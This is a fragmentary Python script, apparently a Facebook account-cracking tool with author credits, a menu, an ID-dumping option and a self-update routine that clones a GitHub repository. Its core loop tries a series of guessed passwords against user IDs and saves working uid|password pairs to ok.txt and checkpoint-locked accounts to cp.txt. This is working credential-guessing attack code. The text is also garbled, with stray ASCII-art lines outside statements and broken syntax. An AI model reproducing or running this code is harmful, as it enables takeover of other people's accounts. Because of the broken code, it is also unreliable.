...
#CODING BY : MR ZEEKO (SYCO THE BRAND )
#DON'T FORGET TO GIVE CREDIT TO SYCO
...
def linex():
	os.system('echo  "\n ===')
def logo():
	os.system('echo "\n\n    ╔══════════\n    ║ CODING BY: {AjMaL SHaH}   ║\n    ║ FACEBOOK   : AjMaL sHaH, ║\n    ║ WhatsApp   :+92302....  ║\n   " | lolcat -a -d 2 -s 50')	

def main():
	os.system("clear")
	logo()            
	print("\t\033[93;2m      MAIN MENU\x1b[0m")
	print("")  
\033[9421m _____           
\033[94;1m /__   \___  _ __ 
\033[94;1m    / /\/ _ \| '__|
\033[94;1m   / / | (_) | |    
\033[94;1m   \/   \___/|_|   
...
\033[94;1m     888    oooo
 \033[97;1m   8  88    888
 \033[96;1m    8oooo88   888
\033[95;1m o88o  o888o 888 
\033[93;1m            o88  
	print("\033[91;1m  [1] START CRACK")
	print("\033[93;1m  [2] DUMP/EXTRACT USER-IDZ")
	print("\033[96;1m  [3] Facebook MR ZEEKO")
	print("\033[97;1m  [4] CONTACT ME ON WHATSAPP")
	print("\033[98;1m  [5] UPDATE TOOL")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/ajmal.shah41"])
		main()
	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
		os.system('xdg-open https://www.facebook.com/ajmal.shah41')
		main()
	elif sel =="5" or sel =="05":
		import os
		try:
			os.system("git clone https://github.com/MRZEEKO404/ZEEEKO")
			os.system("rm -rf ZEEEKO.py")
			os.system("cp -f DINO-TOOL/ZEEEKO\\.")
			os.system("rm -rf ZEEEKO-TOOL")
...
def menu():
    ...
    logo()
    print("")
    print("\033[94;1m     HELLO   : \033[92;1m"+xn)
    print("\033[95;1m     REGION  : \033[92;1m") + loc
    print("\033[92;1m     YOUR IP : \033[92;1m") + ip
    print("")

    print("")
    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
    print("\033[93;1m  [2] CRACK WITH MANUAL/CHOOSE PASS")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [Toor-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in q and "EAAA" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [Toor-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [Toor-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [Toor-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [Toor-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [Toor-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [Toor-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [Toor-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
...
def crack_select():
	...
	if select =="1":
		...
		print("\t\033[93;1m  MANUAL PASS CRACKING")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 123, 1122, 321, 1234, 786 ETC")
		print("")
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [AjMaL-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
